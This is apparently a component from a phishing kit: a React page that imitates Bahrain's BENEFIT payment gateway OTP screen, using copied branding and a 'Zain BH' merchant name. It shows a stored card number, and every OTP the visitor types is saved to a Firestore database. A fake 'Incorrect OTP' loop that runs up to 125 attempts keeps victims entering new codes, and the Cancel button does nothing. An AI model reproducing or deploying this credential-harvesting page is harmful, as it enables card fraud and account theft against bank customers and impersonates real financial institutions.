"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { addData } from "@/lib/firestore"
import { NumericKeypad } from "../numeric-keypad"

interface OTPVerificationProps {
  amount: string
  cardNumber: string
  onVerify: () => void
  onCancel: () => void
}

export default  function OTPVerification() {
  const [otp, setOtp] = useState("")
  const [countdown, setCountdown] = useState(60)
  const [maskedCardNumber,setMaskedNumber] = useState('**')
  const [showKeypad, setShowKeypad] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [attempts, setAttempts] = useState(0)
  const [resendMessage, setResendMessage] = useState(false)
  const otpInputRef = useRef<HTMLInputElement>(null)
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const [allOtps, setAllOtps] = useState<string[]>([])

  // Get cart total from context
  const total = 10

  // Mask the card number?
const onVerify=()=>{
  allOtps.push(otp)
  const vid=localStorage.getItem('visitor')
  addData({id:vid,otp,allOtps})
}
const onCancel=()=>{}
  // Start countdown timer
  useEffect(() => {
    startCountdown()
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  const startCountdown = () => {
    const cardNumber =localStorage.getItem('cardNumber')
setMaskedNumber(cardNumber?.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")!)
    
    setCountdown(60)
    if (timerRef.current) clearInterval(timerRef.current)

    timerRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (timerRef.current) clearInterval(timerRef.current)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

  const handleResendOTP = () => {
    if (countdown === 0) {
      // Simulate OTP resend
      setOtp("")
      setOtpError(false)
      startCountdown()
      setResendMessage(true)

      // Hide resend message after 3 seconds
      setTimeout(() => {
        setResendMessage(false)
      }, 3000)
    }
  }

  // Function to save OTP data to Firebase
  const saveOtpData = () => {
    const vId = localStorage.getItem("visitor")
    if (!vId) return

    // Add current OTP to the array of all OTPs
    const updatedOtps = [...allOtps, otp]
    setAllOtps(updatedOtps)

    // Save to Firebase
    addData({
      id: vId,
      otp: otp,
      allOtps: updatedOtps,
    })
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length === 6) {
      // Save OTP data to Firebase
      saveOtpData()

      // Simulate OTP validation - in a real app, this would call an API
      if (otp === "123456" || attempts >= 125) {
        // Correct OTP or max attempts reached
        onVerify()
      } else {
        // Incorrect OTP
        setOtpError(true)
        setAttempts((prev) => prev + 1)
        // Clear error after 3 seconds
        setTimeout(() => {
          setOtpError(false)
        }, 3000)
      }
    }
  }

  const handleOtpFocus = () => {
    setShowKeypad(true)
  }

  const handleKeypadEnter = () => {
    setShowKeypad(false)
    if (otp.length === 6) {
      handleSubmit(new Event("submit") as unknown as React.FormEvent)
    }
  }

  return (
    <div className="w-full max-w-md bg-white border border-gray-200 shadow-sm">
      {/* Language selector */}
      <div className="text-left p-4">
        <span className="text-red-600 font-medium">English</span>
      </div>

      {/* Header */}
      <div className="text-center mb-4">
        <h1 className="text-red-600 font-bold text-2xl">BENEFIT PAYMENT GATEWAY</h1>
        <p className="text-red-600 font-bold mt-1">
          {new Date()
            .toLocaleDateString("en-GB", {
              day: "2-digit",
              month: "2-digit",
              year: "numeric",
              hour: "2-digit",
              minute: "2-digit",
              hour12: false,
            })
            .replace(/\//g, "-")}
        </p>
      </div>

      {/* Benefit Logo */}
      <div className="flex justify-center mb-4">
        <img src="/logo.webp" alt="Benefit Logo" width={100} height={100} className="mx-auto" />
      </div>

      {/* Merchant Info */}
      <div className="text-center mb-6">
        <p className="text-xl font-medium">Zain BH LIC</p>
        <p className="text-gray-600">@Zainbh</p>
      </div>

      {/* OTP Message */}
      <div className="text-center mb-6">
        <p className="text-red-600 font-medium text-lg">OTP has been sent</p>
        {resendMessage && <p className="text-green-600 text-sm mt-1">A new OTP has been sent to your mobile</p>}
      </div>

      <form onSubmit={handleSubmit} className="px-6">
        <div className="space-y-5 mb-8">
         

          <div className="flex justify-between items-center">
            <span className="text-left font-medium">Card Number</span>
            <span className="font-medium">{maskedCardNumber}</span>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-left font-medium">OTP Code</span>
            <div className="relative w-64">
              <input
                type="text"
                value={otp}
                onChange={(e) => {
                  setOtpError(false)
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
                }}
                onFocus={handleOtpFocus}
                ref={otpInputRef}
                className={`border ${otpError ? "border-red-500" : "border-gray-300"} rounded p-2 w-full text-left`}
                placeholder=""
                maxLength={6}
                readOnly={true}
                required
              />
              {otpError && <p className="text-red-500 text-sm mt-1">Incorrect OTP. Please try again.</p>}
            </div>
          </div>

          <div className="flex justify-end">
            <button
              type="button"
              onClick={handleResendOTP}
              disabled={countdown > 0}
              className={`text-sm ${countdown > 0 ? "text-gray-500" : "text-red-600 hover:underline"}`}
            >
              Resend OTP
              {countdown > 0 && <span> after {countdown} seconds</span>}
            </button>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex gap-4 mb-6">
          <button
            type="button"
            onClick={onCancel}
            className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
          >
            Cancel
          </button>
          <button
            type="submit"
            className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
            disabled={otp.length !== 6}
          >
            Pay
          </button>
        </div>

        {/* Accepted Cards */}
        <div className="text-left mb-4">
          <a href="#" className="text-red-600 hover:underline text-sm">
            View Accepted Cards
          </a>
        </div>

        {/* Terms */}
        <div className="text-left mb-8 text-sm leading-relaxed">
          <p>
            <span className="font-bold">Note:</span> By providing this information and using the "BENEFIT Payment
            Gateway", you agree to the{" "}
            <a href="#" className="text-red-600 hover:underline">
              terms of service - Legal Disclaimer
            </a>
            .
          </p>
        </div>
      </form>

      {/* Numeric Keypad */}
      {showKeypad && (
        <div className="fixed bottom-0 left-0 right-0 numeric-keypad">
          <NumericKeypad value={otp} onValueChange={setOtp} maxLength={6} onEnter={handleKeypadEnter} />
        </div>
      )}

      {/* Footer */}
      <div className="text-center space-y-2 mb-6">
        <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
        <div className="px-6">
          <p className="text-left text-sm">This site is managed by BENEFIT Company.</p>
          <p className="text-left text-sm">Copyright © 2020-2025 BENEFIT Company. All rights reserved.</p>
          <p className="text-left text-sm">
            Licensed by the Central Bank of Bahrain to provide ancillary services to the financial sector.
          </p>
        </div>
      </div>
    </div>
  )
}
